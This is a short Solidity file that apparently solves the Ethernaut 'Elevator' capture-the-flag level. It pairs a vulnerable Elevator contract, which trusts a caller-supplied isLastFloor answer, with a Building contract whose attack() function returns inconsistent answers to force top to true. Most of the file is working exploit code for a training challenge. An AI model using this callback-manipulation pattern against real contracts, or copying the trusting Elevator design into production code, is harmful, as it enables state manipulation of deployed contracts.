// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuilding {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Building {

  uint public isSecond;

  function isLastFloor(uint _n) external returns (bool){
    if(isSecond==0) {
      isSecond =_n;
      return false;
      }
    return true;
  }

   function attack(Elevator _target,uint _floor) public {
        require(_floor>0);
        _target.goTo(_floor);
    }

}

